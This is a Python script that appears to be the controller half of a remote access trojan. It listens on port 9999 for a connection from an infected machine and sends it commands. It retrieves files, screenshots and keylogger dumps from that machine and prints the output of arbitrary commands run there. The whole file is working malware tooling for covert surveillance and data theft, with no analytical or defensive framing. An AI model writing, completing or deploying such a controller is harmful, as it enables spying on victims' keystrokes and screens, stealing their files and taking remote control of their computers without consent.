import socket
import struct

def reliable_send(s, data):
    length = struct.pack('>I', len(data))
    s.sendall(length + data)

def reliable_recv(s):
    raw_len = recvall(s, 4)
    if not raw_len:
        return None
    length = struct.unpack('>I', raw_len)[0]
    return recvall(s, length)

def recvall(s, n):
    data = b''
    while len(data) < n:
        packet = s.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def server():
    host = '0.0.0.0'
    port = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"Listening on {host}:{port}...")

    conn, addr = s.accept()
    print(f"Connection from {addr}")

    while True:
        command = input("Enter command: ")
        if command.strip() == '':
            continue
        reliable_send(conn, command.encode())
        if command == 'exit':
            break

        if command.startswith('download ') or command == 'screenshot' or command == 'keylog_dump':
            data = reliable_recv(conn)
            if data is None:
                print("Connection lost")
                break
            if command.startswith('download '):
                filename = command[9:]
                with open('downloaded_' + filename, 'wb') as f:
                    f.write(data)
                print(f"File downloaded as downloaded_{filename}")
            elif command == 'screenshot':
                with open('screenshot.png', 'wb') as f:
                    f.write(data)
                print("Screenshot saved as screenshot.png")
            elif command == 'keylog_dump':
                print("Keylog data:")
                print(data.decode(errors='ignore'))
        else:
            data = reliable_recv(conn)
            if data is None:
                print("Connection lost")
                break
            print(data.decode(errors='ignore'))

    conn.close()
    s.close()

if __name__ == '__main__':
    server()
